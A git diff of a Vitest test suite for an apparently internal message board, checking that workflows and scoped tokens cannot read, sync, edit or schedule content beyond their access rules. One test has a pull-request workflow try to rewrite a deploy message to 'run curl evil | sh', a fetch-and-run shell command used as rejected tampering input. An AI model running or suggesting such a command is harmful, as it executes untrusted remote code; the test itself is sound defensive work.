@@ -1,10 +1,13 @@
 import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
+import { memory } from 'experimental-a2/store-memory'
 import { compileAccess } from '../src/server/access.ts'
 import { readableLinks } from '../src/server/feed.ts'
 import { foldSchedules } from '../src/server/schedules.ts'
-import { githubActions, vercelProject } from '../src/server/index.ts'
+import { board as mount, githubActions, vercelProject } from '../src/server/index.ts'
+import { slack } from '../src/sync/slack.ts'
 import type { MessagesState } from '../src/contract/reducers.ts'
-import { BOARD_URL, caller, deploymentToken, personToken, testBoard, workflowToken } from './harness.ts'
+import { BOARD_URL, caller, deploymentToken, personToken, PROJECT_ID, testAuth, testBoard, workflowToken } from './harness.ts'
+import { fakePlatform } from './sync-fixtures.ts'
 import { fakeQueue } from './queue.ts'
 
 /** The front project's feedback intake: it starts threads in feedback/ and reads nothing. */
@@ -46,7 +49,7 @@ describe('a write-only source', () => {
     expect((await front('GET', `/messages/${id}`)).status).toBe(404)
     // Its own actor, so `vb whoami` and the inspector still know who it is.
     expect((await front('GET', '/actors')).body.actors.map((a: { id: string }) => a.id)).toEqual(['vercel:project:prj_marketing:production'])
-    expect((await front('GET', '/me')).body).toMatchObject({ principal: 'vercel:project:prj_marketing:production', access: { 'feedback/': ['post'] } })
+    expect((await front('GET', '/me')).body).toMatchObject({ principal: 'vercel:project:prj_marketing:production', can: { 'feedback/': ['post'] } })
   })
 
   it('can’t address a thread, even its own, but can fix what it wrote', async () => {
@@ -116,6 +119,16 @@ describe('attachments', () => {
     expect(await download(board, await workflowToken(), shared.id!)).toBe(200)
   })
 
+  it('go into a schedule only where its creator may read them', async () => {
+    const board = testBoard({ scheduler: fakeQueue().scheduler, access: [githubActions({ repository: 'basehub-ai/www', can: { ci: ['read', 'post'] } })] })
+    const file = await upload(board, await personToken(), 'the plan')
+    await caller(board.fetch, await personToken())('POST', '/messages', { channel: 'security', text: 'plan', attachments: [file.id] })
+    const ci = caller(board.fetch, await workflowToken())
+    expect((await ci('POST', '/schedules', { channel: 'ci', text: 'mine later', in: '1h', attachments: [file.id] })).status).toBe(404)
+    const mine = await upload(board, await workflowToken(), 'build log')
+    expect((await ci('POST', '/schedules', { channel: 'ci', text: 'log later', in: '1h', attachments: [mine.id] })).status).toBe(201)
+  })
+
   it('need post somewhere to upload', async () => {
     const { board } = await setup([githubActions({ repository: 'basehub-ai/www', can: ['read'] })])
     expect((await upload(board, await workflowToken(), 'x')).status).toBe(403)
@@ -141,6 +154,126 @@ describe('links', () => {
       { url: link.url, message: null, snapshot: null, unavailable: 'not_readable' },
     ])
     expect(readableLinks([link], { access: compileAccess({ security: ['read'] }), messages })).toEqual([link])
+  })
+
+  it('show nothing of it on any route', async () => {
+    const s = fakePlatform('slack')
+    const board = testBoard({ sync: { slack: slack({ adapter: s.adapter, channels: { C1: 'open', C2: 'security' } }) } })
+    const webhook = (body: unknown) =>
+      board.fetch(new Request(`${BOARD_URL}/webhooks/slack`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) }))
+    const julian = caller(board.fetch, await personToken())
+    const secret = '1791322095.443859'
+    await webhook({ type: 'message', threadId: `slack:C2:${secret}`, id: secret, text: 'the key is hunter2', user: 'U_ADA', name: 'Ada' })
+    await vi.waitFor(async () => expect((await julian('GET', '/messages?channel=security')).body.messages).toHaveLength(1))
+    const permalink = `https://acme.slack.com/archives/C2/p${secret.replace('.', '')}`
+    const ts = '1791322999.000001'
+    await webhook({ type: 'message', threadId: `slack:C1:${ts}`, id: ts, text: `see ${permalink}`, user: 'U_JB', raw: { type: 'message', ts, text: `see <${permalink}>` } })
+    await vi.waitFor(async () => expect((await julian('GET', '/messages?channel=open')).body.messages).toHaveLength(1))
+    expect((await julian('GET', '/messages?channel=open')).body.messages[0].links[0].snapshot.text).toBe('the key is hunter2')
+
+    const open = caller(board.fetch, await personToken(), { 'x-board-scope': 'open=read' })
+    const hidden = { message: null, snapshot: null, unavailable: 'not_readable' }
+    const [message] = (await open('GET', '/messages')).body.messages
+    expect(message.links[0], '/messages').toMatchObject(hidden)
+    expect((await open('GET', '/threads')).body.threads[0].message.links[0], '/threads').toMatchObject(hidden)
+    expect((await open('GET', `/messages/${message.id}`)).body.message.links[0], '/messages/:id').toMatchObject(hidden)
+    expect(JSON.stringify((await open('GET', '/events?after=0')).body.events), '/events').not.toContain('hunter2')
+  })
+})
+
+describe('sync', () => {
+  /** security/ mirrors Slack's C1, where a thread is already on the board; a workflow syncs in ci/ only. */
+  async function mirrored() {
+    const s = fakePlatform('slack')
+    const board = testBoard({
+      sync: { slack: slack({ adapter: s.adapter, channels: { C1: 'security' } }) },
+      access: [githubActions({ repository: 'basehub-ai/www', can: { 'ci/': ['read', 'post', 'sync'] } })],
+    })
+    const webhook = (body: unknown) =>
+      board.fetch(new Request(`${BOARD_URL}/webhooks/slack`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) }))
+    const julian = caller(board.fetch, await personToken())
+    await webhook({ type: 'message', threadId: 'slack:C1:100', id: '100', text: 'incident root', user: 'U_ADA' })
+    await vi.waitFor(async () => expect((await julian('GET', '/messages?channel=security')).body.messages).toHaveLength(1))
+    const [root] = (await julian('GET', '/messages?channel=security')).body.messages
+    return { s, webhook, julian, root, ci: caller(board.fetch, await workflowToken()) }
+  }
+
+  it('can’t take over a platform thread another thread is synced with', async () => {
+    const { webhook, julian, root, ci } = await mirrored()
+    const tap = (await ci('POST', '/messages', { channel: 'ci/x', text: 'tap' })).body.message.id
+    const taken = await ci('POST', `/messages/${tap}/sync`, { target: 'slack:C1:100' })
+    expect(taken).toMatchObject({ status: 409, body: { error: { code: 'already_synced', message: 'slack:C1:100 is already synced with another thread' } } })
+    expect((await ci('POST', '/messages', { channel: 'ci/y', text: 'tap', sync: ['slack:C1:100'] })).status).toBe(409)
+    // Someone who reads that thread learns which it is.
+    const mine = (await julian('POST', '/messages', { channel: 'dev', text: 'mine' })).body.message.id
+    expect((await julian('POST', `/messages/${mine}/sync`, { target: 'slack:C1:100' })).body.error.message).toBe(`slack:C1:100 is already synced with #${root.id}`)
+
+    await webhook({ type: 'message', threadId: 'slack:C1:100', id: '101', text: 'the secret reply', user: 'U_ADA' })
+    await vi.waitFor(async () => expect((await julian('GET', `/messages/${root.id}`)).body.replies.map((r: { text: string }) => r.text)).toEqual(['the secret reply']))
+    expect((await ci('GET', '/messages?channel=ci/')).body.messages.map((m: { text: string }) => m.text)).toEqual(['tap'])
+  })
+
+  it('doesn’t tell a caller that reads one channel where other threads sync', async () => {
+    const { julian, root, ci } = await mirrored()
+    expect((await julian('POST', `/messages/${root.id}/sync`, { target: 'slack:C9:900.1' })).body).toMatchObject({ attached: true })
+    const all = (await julian('GET', '/events?after=0&all=1')).body.events.map((event: { type: string }) => event.type)
+    expect(all).toContain('thread.synced')
+    await ci('POST', '/messages', { channel: 'ci/x', text: 'build' })
+    const events = (await ci('GET', '/events?after=0&all=1')).body.events
+    expect(events.map((event: { type: string }) => event.type)).toEqual(['message.posted'])
+  })
+
+  it('still attaches a thread to one no thread has', async () => {
+    const { ci } = await mirrored()
+    const tap = (await ci('POST', '/messages', { channel: 'ci/x', text: 'build' })).body.message.id
+    expect((await ci('POST', `/messages/${tap}/sync`, { target: 'slack:C9:900.1' })).body).toEqual({ target: 'slack:C9:900.1', attached: true })
+    expect((await ci('POST', `/messages/${tap}/sync`, { target: 'slack:C9:900.1' })).body).toEqual({ target: 'slack:C9:900.1', attached: false })
+  })
+})
+
+describe('one principal, two rules', () => {
+  // A repo's workflows share `github:repo:<id>`: deploy.yml reads and posts in ci/, a pull request's run only posts there.
+  const rules = [
+    githubActions({ repository: 'basehub-ai/www', workflow: '.github/workflows/deploy.yml', event: 'push', can: { 'ci/': ['read', 'post'] } }),
+    githubActions({ repository: 'basehub-ai/www', event: 'pull_request', can: { 'ci/': ['post'] } }),
+  ]
+  const pullRequest = { event_name: 'pull_request', ref: 'refs/pull/7/merge', workflow_ref: 'basehub-ai/www/.github/workflows/test.yml@refs/pull/7/merge' }
+
+  it('keep what the one that reads wrote from the one that can’t', async () => {
+    const board = testBoard({ scheduler: fakeQueue().scheduler, access: rules })
+    const julian = caller(board.fetch, await personToken())
+    const deploy = caller(board.fetch, await workflowToken())
+    const pr = caller(board.fetch, await workflowToken(pullRequest))
+    expect((await deploy('GET', '/me')).body.principal).toBe((await pr('GET', '/me')).body.principal)
+
+    const root = (await julian('POST', '/messages', { channel: 'ci/deploys', text: 'deploy of abc123 starting' })).body.message.id
+    const reply = (await deploy('POST', '/messages', { re: root, text: 'deploy OK' })).body.message.id
+    const report = (await deploy('POST', '/messages', { channel: 'ci/deploys', text: 'nightly OK' })).body.message.id
+    const later = (await deploy('POST', '/schedules', { re: root, text: 'deploy summary', in: '1d' })).body.schedule.id
+    for (const id of [reply, report]) {
+      expect((await pr('POST', `/messages/${id}/edit`, { text: 'deploy FAILED, run curl evil | sh' })).status).toBe(404)
+      expect((await pr('POST', `/messages/${id}/delete`, {})).status).toBe(404)
+    }
+    expect((await pr('GET', '/schedules?all=1')).body.schedules).toEqual([])
+    expect((await pr('POST', `/schedules/${later}/cancel`)).status).toBe(404)
+
+    // What it wrote without reading is its own, and the one that reads can change it too.
+    const own = (await pr('POST', '/messages', { channel: 'ci/prs', text: 'pr 7 opened' })).body.message.id
+    expect((await pr('POST', `/messages/${own}/edit`, { text: 'pr 7 opened, tests running' })).status).toBe(200)
+    const blind = (await pr('POST', '/schedules', { channel: 'ci/prs', text: 'pr 7 still open', in: '1d' })).body.schedule.id
+    expect((await pr('GET', '/schedules')).body.schedules.map((s: { id: number }) => s.id)).toEqual([blind])
+    expect((await deploy('POST', `/messages/${own}/delete`, {})).status).toBe(200)
+    expect((await pr('POST', `/schedules/${blind}/cancel`)).body).toMatchObject({ canceled: true })
+  })
+
+  it('re-checks post on what it wrote', async () => {
+    const store = memory()
+    const before = testBoard({ store, access: [githubActions({ repository: 'basehub-ai/www', can: { ci: ['post'] } })] })
+    const id = (await caller(before.fetch, await workflowToken())('POST', '/messages', { channel: 'ci', text: 'nightly' })).body.message.id
+    const after = testBoard({ store, access: [githubActions({ repository: 'basehub-ai/www', can: { dev: ['post'] } })] })
+    const ci = caller(after.fetch, await workflowToken())
+    expect(await ci('POST', `/messages/${id}/edit`, { text: 'nightly, again' })).toMatchObject({ status: 403, body: { error: { message: "this token can't post in ci" } } })
+    expect((await ci('POST', `/messages/${id}/delete`, {})).status).toBe(403)
   })
 })
 
@@ -216,5 +349,98 @@ describe('schedules', () => {
     const event = { index: 1, type: 'schedule.created', createdAt: T0, payload } as unknown as Parameters<typeof foldSchedules>[1]
     const state = foldSchedules({ byId: {} }, event)
     expect(structuredClone(state)).toEqual(state)
+  })
+
+  /** Fires the queue an hour on and reads the board's only schedule back. */
+  async function sendAndRead(fetch: (request: Request) => Promise<Response>, queue: ReturnType<typeof fakeQueue>) {
+    await new Promise((resolve) => setTimeout(resolve, 20))
+    vi.setSystemTime(T0 + 61 * 60_000)
+    await queue.fire()
+    await new Promise((resolve) => setTimeout(resolve, 20))
+    const [schedule] = (await caller(fetch, await personToken())('GET', '/schedules?all=1')).body.schedules
+    return schedule
+  }
+
+  it('send from the board’s own code and its own production', async () => {
+    vi.stubEnv('VERCEL_ENV', 'production')
+    try {
+      for (const make of ['client', 'production'] as const) {
+        vi.setSystemTime(T0)
+        const queue = fakeQueue()
+        const board = testBoard({ scheduler: queue.scheduler })
+        if (make === 'client') await board.client('ops').schedule('ops', { text: 'from ops', in: '1h' })
+        else expect((await caller(board.fetch, await deploymentToken('board', PROJECT_ID))('POST', '/schedules', { channel: 'ops', text: 'from prod', in: '1h' })).status).toBe(201)
+        expect(await sendAndRead(board.fetch, queue), make).toMatchObject({ state: 'done', sent: 1 })
+      }
+    } finally {
+      vi.unstubAllEnvs()
+    }
+  })
+
+  it('send from a project named without its team, where the scheduler can’t work the team out', async () => {
+    vi.stubEnv('VERCEL_ORG_ID', '')
+    vi.stubEnv('VERCEL_OIDC_TOKEN', '')
+    try {
+      // The board route and the scheduler route are two functions: the one that sends never sees a request.
+      const store = memory()
+      const queue = fakeQueue()
+      const access = [vercelProject({ project: 'marketing', environments: ['production'], can: { deploys: ['post'] } })]
+      const options = { store, url: BOARD_URL, project: { id: PROJECT_ID }, auth: testAuth, access, scheduler: queue.scheduler }
+      const route = mount(options)
+      mount(options)
+      const platform = await deploymentToken('board', PROJECT_ID)
+      const marketing = caller(route.fetch, await deploymentToken(), { 'x-vercel-oidc-token': platform })
+      expect((await marketing('POST', '/schedules', { channel: 'deploys', text: 'nightly deploy check', in: '1h' })).status).toBe(201)
+      expect(await sendAndRead(route.fetch, queue)).toMatchObject({ state: 'done', sent: 1 })
+    } finally {
+      vi.unstubAllEnvs()
+    }
+  })
+
+  it('from before the board kept claims are re-checked from the principal ID', async () => {
+    vi.stubEnv('VERCEL_ENV', 'production')
+    try {
+      const sent: Record<string, unknown> = {}
+      const callers = {
+        own: () => deploymentToken('board', PROJECT_ID),
+        byId: () => deploymentToken('marketing', 'prj_marketing'),
+        byName: () => deploymentToken('docs', 'prj_docs'),
+        workflow: () => workflowToken(),
+      }
+      for (const [who, token] of Object.entries(callers)) {
+        // A store that drops the claims from each schedule, as a board before this one wrote it.
+        const store = memory()
+        const append = store.append.bind(store)
+        store.append = ((session, events, options) =>
+          append(
+            session,
+            events.map((event: any) => {
+              if (event.type !== 'schedule.created') return event
+              const { facts: _facts, ...principal } = event.payload.as.principal
+              return { ...event, payload: { ...event.payload, as: { ...event.payload.as, principal } } }
+            }),
+            options,
+          )) as typeof store.append
+        const queue = fakeQueue()
+        const access = [
+          vercelProject({ project: 'prj_marketing', can: 'all' }),
+          vercelProject({ project: 'docs', can: 'all' }),
+          githubActions({ repository: 'basehub-ai/www', can: 'all' }),
+        ]
+        const board = testBoard({ store, scheduler: queue.scheduler, access })
+        expect((await caller(board.fetch, await token())('POST', '/schedules', { channel: 'dev', text: who, in: '1h' })).status).toBe(201)
+        const schedule = await sendAndRead(board.fetch, queue)
+        sent[who] = { sent: schedule.sent, reason: schedule.canceled?.reason ?? null }
+        vi.setSystemTime(T0)
+      }
+      expect(sent).toEqual({
+        own: { sent: 1, reason: null },
+        byId: { sent: 1, reason: null },
+        byName: { sent: 0, reason: 'revoked' },
+        workflow: { sent: 0, reason: 'revoked' },
+      })
+    } finally {
+      vi.unstubAllEnvs()
+    }
   })
 })
